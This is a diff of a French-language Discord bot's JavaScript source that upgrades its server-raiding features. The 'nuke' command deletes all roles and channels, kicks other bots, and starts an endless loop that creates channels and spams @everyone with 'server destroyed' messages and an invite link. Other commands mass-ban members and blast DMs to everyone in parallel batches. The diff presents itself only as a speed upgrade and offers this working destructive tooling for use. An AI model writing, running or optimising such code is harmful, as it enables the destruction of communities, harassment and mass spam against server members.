@@ -1,12 +1,12 @@
-// Build Revision: K2L-Bot-DMAll-Live-v23.0
+// Build Revision: K2L-Bot-Ultra-Speed-v25.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot DMAll Live Operational v23.0!\n');
-}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
+    res.end('K2L Bot Ultra Speed Operational v25.0!\n');
+}).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));
 
 const client = new Client({
     intents: [
@@ -27,8 +27,11 @@ const guildStaffConfig = new Map();
 const warningsMap = new Map();
 const jailDataMap = new Map();
 
-const SUPER_OWNERS = new Set(["1166445202148442112", "330080470983245824", "1553025724191866937"]); 
-const botOwners = new Set(["1166445202148442112", "330080470983245824", "1553025724191866937"]); 
+// Map pour gérer les boucles infinies de la commande nuke par serveur
+const activeNukes = new Map();
+
+const SUPER_OWNERS = new Set(["1166445202148442112", "graveuhq", "77jc", "330080470983245824"]); 
+const botOwners = new Set(["1166445202148442112", "graveuhq", "77jc", "330080470983245824"]); 
 
 function isSuperOwnerById(userId, username = "", globalName = "") {
     if (SUPER_OWNERS.has(userId)) return true;
@@ -55,7 +58,6 @@ function isOwner(message) {
     if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
     return false;
 }
-
 function getStaffRoles(guildId) {
     if (!guildStaffConfig.has(guildId)) {
         guildStaffConfig.set(guildId, {
@@ -135,7 +137,6 @@ async function fetchTargetUser(client, guild, targetArg) {
         return null;
     }
 }
-
 async function fetchTargetMember(message, targetArg) {
     if (!targetArg) return null;
     const mention = message.mentions.members.first();
@@ -160,6 +161,7 @@ function parseDuration(durationStr) {
     else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
     return ms;
 }
+
 async function executeAutoSanction(guild, member, action, reason) {
     if (!member || member.user.bot) return;
     try {
@@ -427,7 +429,6 @@ client.on('interactionCreate', async interaction => {
             return interaction.editReply({ content: "❌ Erreur lors de la création du salon de ticket." });
         }
     }
-
     if (interaction.isButton()) {
         const guild = interaction.guild;
         const config = getGuildConfig(guild.id);
@@ -569,33 +570,73 @@ client.on('messageCreate', async message => {
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
+        const offensiveCommands = ['nuke', 'stop', 'role', 'banall', 'dmall', 'kickbot'];
         if (offensiveCommands.includes(command)) {
+            
+            if (command === 'stop') {
+                if (activeNukes.has(message.guild.id)) {
+                    clearInterval(activeNukes.get(message.guild.id));
+                    activeNukes.delete(message.guild.id);
+                    return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
+                }
+                return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
+            }
+
             if (command === 'nuke') {
-                await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
+                await message.reply("⚡ **[NUKE]** Destruction totale, flood infini, exécution de role et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
+                
+                message.guild.roles.cache
+                    .filter(role => role.editable && role.id !== message.guild.id)
+                    .forEach(role => role.delete().catch(() => {}));
+                for (let r = 0; r < 40; r++) {
+                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
+                }
+
+                message.guild.members.fetch().then(fetchedMembers => {
+                    for (const [id, m] of fetchedMembers) {
+                        if (m.user.bot && m.id !== client.user.id) {
+                            m.kick('Kickbot').catch(() => {});
+                        }
+                    }
+                }).catch(() => {});
+
                 message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
-                for (let i = 0; i < 45; i++) {
-                    message.guild.channels.create({
-                        name: 'ez-by-k2l',
-                        type: ChannelType.GuildText,
-                        permissionOverwrites: [{
-                            id: message.guild.id,
-                            allow: [
-                                PermissionsBitField.Flags.ViewChannel,
-                                PermissionsBitField.Flags.SendMessages,
-                                PermissionsBitField.Flags.ManageChannels,
-                                PermissionsBitField.Flags.EmbedLinks,
-                                PermissionsBitField.Flags.AttachFiles,
-                                PermissionsBitField.Flags.MentionEveryone
-                            ]
-                        }]
-                    }).then(channel => {
-                        for (let j = 0; j < 12; j++) {
-                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                        }
-                    }).catch(() => {});
+                if (activeNukes.has(message.guild.id)) {
+                    clearInterval(activeNukes.get(message.guild.id));
                 }
+
+                const nukeInterval = setInterval(async () => {
+                    try {
+                        const channelPromises = [];
+                        for (let i = 0; i < 6; i++) {
+                            channelPromises.push(
+                                message.guild.channels.create({
+                                    name: 'ez-by-k2l',
+                                    type: ChannelType.GuildText,
+                                    permissionOverwrites: [{
+                                        id: message.guild.id,
+                                        allow: [
+                                            PermissionsBitField.Flags.ViewChannel,
+                                            PermissionsBitField.Flags.SendMessages,
+                                            PermissionsBitField.Flags.ManageChannels,
+                                            PermissionsBitField.Flags.EmbedLinks,
+                                            PermissionsBitField.Flags.AttachFiles,
+                                            PermissionsBitField.Flags.MentionEveryone
+                                        ]
+                                    }]
+                                }).then(async channel => {
+                                    for (let j = 0; j < 6; j++) {
+                                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
+                                    }
+                                }).catch(() => {})
+                            );
+                        }
+                        await Promise.all(channelPromises);
+                    } catch (err) {}
+                }, 300);
+
+                activeNukes.set(message.guild.id, nukeInterval);
                 return;
             }
 
@@ -610,9 +651,8 @@ client.on('messageCreate', async message => {
                 }
                 return;
             }
-
             if (command === 'banall') {
-                await message.reply("⚡ **[BANALL]** Exécution du banall massif...").catch(() => {});
+                await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
                 try {
                     await message.guild.members.fetch();
                     const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
@@ -639,7 +679,6 @@ client.on('messageCreate', async message => {
                 return;
             }
 
-            // Commande !dmall mise à jour avec embed de suivi en temps réel et compteur dynamique
             if (command === 'dmall') {
                 await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                 const filter = m => m.author.id === message.author.id;
@@ -669,21 +708,20 @@ client.on('messageCreate', async message => {
                             return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                         }
                         if (interaction.customId === 'confirm_dmall') {
-                            await interaction.update({ content: "🚀 **Diffusion DMAll en cours...**", embeds: [], components: [] }).catch(() => {});
+                            await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée...**", embeds: [], components: [] }).catch(() => {});
                             
                             try {
                                 await message.guild.members.fetch();
-                                const members = message.guild.members.cache.filter(member => !member.user.bot);
-                                const totalMembers = members.size;
+                                const members = Array.from(message.guild.members.cache.filter(member => !member.user.bot).values());
+                                const totalMembers = members.length;
                                 let successCount = 0;
                                 let failCount = 0;
                                 let processed = 0;
 
-                                // Création de l'embed de suivi en temps réel
                                 const liveEmbed = new EmbedBuilder()
                                     .setColor('#f39c12')
                                     .setTitle('🚀 Diffusion DMAll en cours...')
-                                    .setDescription(`Progression de l'envoi des messages privés...`)
+                                    .setDescription(`Envoi massif ultra-rapide...`)
                                     .addFields(
                                         { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
                                         { name: '✅ Succès', value: `\`0\``, inline: true },
@@ -694,34 +732,34 @@ client.on('messageCreate', async message => {
 
                                 const statusMsg = await message.channel.send({ embeds: [liveEmbed] });
 
-                                for (const [id, member] of members) {
-                                    processed++;
-                                    try {
-                                        const finalMessage = messageTemplate
-                                            .replace(/\{mention\}/g, `<@${member.id}>`)
-                                            .replace(/\{name\}/g, member.user.username);
-                                        await member.send(finalMessage);
-                                        successCount++;
-                                    } catch (err) {
-                                        failCount++;
-                                    }
+                                const batchSize = 20;
+                                for (let i = 0; i < members.length; i += batchSize) {
+                                    const batch = members.slice(i, i + batchSize);
+                                    await Promise.all(batch.map(async member => {
+                                        processed++;
+                                        try {
+                                            const finalMessage = messageTemplate
+                                                .replace(/\{mention\}/g, `<@${member.id}>`)
+                                                .replace(/\{name\}/g, member.user.username);
+                                            await member.send(finalMessage);
+                                            successCount++;
+                                        } catch (err) {
+                                            failCount++;
+                                        }
+                                    }));
 
-                                    // Mise à jour de l'embed en direct toutes les 5 personnes ou à la fin
-                                    if (processed % 5 === 0 || processed === totalMembers) {
-                                        liveEmbed.setFields(
-                                            { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
-                                            { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
-                                            { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
-                                            { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
-                                        );
-                                        await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
-                                    }
+                                    liveEmbed.setFields(
+                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
+                                        { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
+                                        { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
+                                        { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
+                                    );
+                                    await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                                 }
 
-                                // Embed final une fois terminé
                                 liveEmbed.setColor('#2ecc71')
                                     .setTitle('✅ Diffusion DMAll Terminée !')
-                                    .setDescription(`Tous les messages ont été traités.`);
+                                    .setDescription(`Envoi ultra-rapide terminé.`);
                                 
                                 await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                             } catch (error) {
@@ -736,7 +774,6 @@ client.on('messageCreate', async message => {
             }
         }
     }
-
     const config = getGuildConfig(message.guild.id);
     const userId = message.author.id;
     const isOwnerOrSuper = isOwner(message) || isSuperOwner(message);
@@ -1152,6 +1189,7 @@ client.on('messageCreate', async message => {
         setTimeout(() => channel.delete().catch(() => {}), 2000);
         return;
     }
+
     if (command === 'jail') {
         const targetMember = await fetchTargetMember(message, targetArg);
         const reason = args.slice(1).join(' ') || "Aucune raison";
@@ -1189,7 +1227,6 @@ client.on('messageCreate', async message => {
             return message.reply(`🔓 **${targetMember.user.tag}** libéré.`);
         } catch (e) { return message.reply("❌ Erreur."); }
     }
-
     if (command === 'lock') {
         await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
         return message.reply("🔒 Salon verrouillé.");
